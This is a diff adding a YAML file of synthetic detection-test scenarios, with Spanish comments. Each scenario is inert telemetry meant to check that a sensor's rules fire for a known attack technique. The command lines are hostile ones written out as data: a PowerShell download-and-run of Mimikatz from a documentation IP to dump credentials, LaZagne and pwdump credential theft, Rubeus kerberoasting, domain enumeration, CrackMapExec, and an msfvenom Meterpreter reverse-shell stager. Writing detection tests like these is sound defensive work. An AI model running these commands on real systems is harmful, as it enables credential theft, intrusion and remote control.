@@ -1,0 +1,177 @@
+# Escenarios de validacion de deteccion (SIM-1/SIM-2).
+# Telemetria sintetica e inerte: el mismo esquema de eventos que
+# envia el sensor, sin ejecutar nada en ningun equipo. Cada escenario
+# declara las alertas que el motor DEBE disparar (shipped rule/sequence
+# id); el test de CI falla si una deja de detectarse.
+
+- name: Herramienta de volcado Mimikatz (sintetico)
+  id: sim-mimikatz
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: herramienta
+    de volcado Mimikatz. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1003.001
+  host: LAB-SIM-MIMIKATZ
+  user: CORP\sim
+  expected:
+  - rule: a1b2c3d4-0001-4a01-9e01-010101010101
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4170
+      name: powershell.exe
+      command_line: powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/mimikatz.ps1');
+        Invoke-Mimikatz -DumpCreds"
+- name: Cosecha de contrasenas con LaZagne (sintetico)
+  id: sim-lazagne
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: cosecha de contrasenas
+    con LaZagne. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1003
+  host: LAB-SIM-LAZAGNE
+  user: CORP\sim
+  expected:
+  - rule: a1b2c3d4-0002-4a02-9e02-020202020202
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4171
+      name: lazagne.exe
+      command_line: laZagne.exe all
+- name: Dumping local de hashes con Pwdump (sintetico)
+  id: sim-pwdump
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: dumping local
+    de hashes con Pwdump. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1003.002
+  host: LAB-SIM-PWDUMP
+  user: CORP\sim
+  expected:
+  - rule: a1b2c3d4-0003-4a03-9e03-030303030303
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4172
+      name: pwdump.exe
+      command_line: pwdump.exe 127.0.0.1
+- name: Abuso de Kerberos con Rubeus (sintetico)
+  id: sim-rubeus-kerberoast
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: abuso de Kerberos
+    con Rubeus. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1558.003
+  host: LAB-SIM-RUBEUS-KERBEROAST
+  user: CORP\sim
+  expected:
+  - rule: a1b2c3d4-0004-4a04-9e04-040404040404
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4173
+      name: rubeus.exe
+      command_line: rubeus.exe kerberoast /format:hashcat
+- name: Mapeo de dominio con SharpHound (sintetico)
+  id: sim-sharphound
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: mapeo de dominio
+    con SharpHound. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1087.002
+  host: LAB-SIM-SHARPHOUND
+  user: CORP\sim
+  expected:
+  - rule: a1b2c3d4-0005-4a05-9e05-050505050505
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4174
+      name: sharphound.exe
+      command_line: sharphound.exe -c All
+- name: Enumeracion de directorio con AdFind (sintetico)
+  id: sim-adfind
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: enumeracion
+    de directorio con AdFind. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1087.002
+  host: LAB-SIM-ADFIND
+  user: CORP\sim
+  expected:
+  - rule: a1b2c3d4-0006-4a06-9e06-060606060606
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4175
+      name: adfind.exe
+      command_line: adfind.exe -f objectcategory=computer
+- name: Ejecucion remota con CrackMapExec o Impacket (sintetico)
+  id: sim-crackmapexec
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: ejecucion remota
+    con CrackMapExec. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1021
+  host: LAB-SIM-CRACKMAPEXEC
+  user: CORP\sim
+  expected:
+  - rule: a1b2c3d4-0007-4a07-9e07-070707070707
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4176
+      name: crackmapexec.exe
+      command_line: crackmapexec.exe smb 10.10.0.5 -u sim -p x
+- name: Stager de Meterpreter o Metasploit (sintetico)
+  id: sim-msfvenom-stager
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: stager de Meterpreter
+    con msfvenom. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1059
+  host: LAB-SIM-MSFVENOM-STAGER
+  user: CORP\sim
+  expected:
+  - rule: a1b2c3d4-0008-4a08-9e08-080808080808
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4177
+      name: msfvenom.exe
+      command_line: msfvenom.exe -p windows/meterpreter/reverse_tcp LHOST=203.0.113.15 -f exe -o C:\Users\Public\p.exe
+- name: Canal de control remoto silencioso con AnyDesk (sintetico)
+  id: sim-anydesk-silent
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: canal de control
+    remoto silencioso con AnyDesk. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1219
+  host: LAB-SIM-ANYDESK-SILENT
+  user: CORP\sim
+  expected:
+  - rule: a1b2c3d4-0009-4a09-9e09-090909090909
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4178
+      name: anydesk.exe
+      command_line: anydesk.exe --password S3cret!
+- name: Reconocimiento de dominio con comandos net/nltest (sintetico)
+  id: sim-net-domain-enum
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: reconocimiento
+    de dominio con net group. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1087.002
+  host: LAB-SIM-NET-DOMAIN-ENUM
+  user: CORP\sim
+  expected:
+  - rule: a1b2c3d4-000a-4a0a-9e0a-0a0a0a0a0a0a
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4179
+      name: net.exe
+      command_line: net.exe group "Domain Admins" /domain
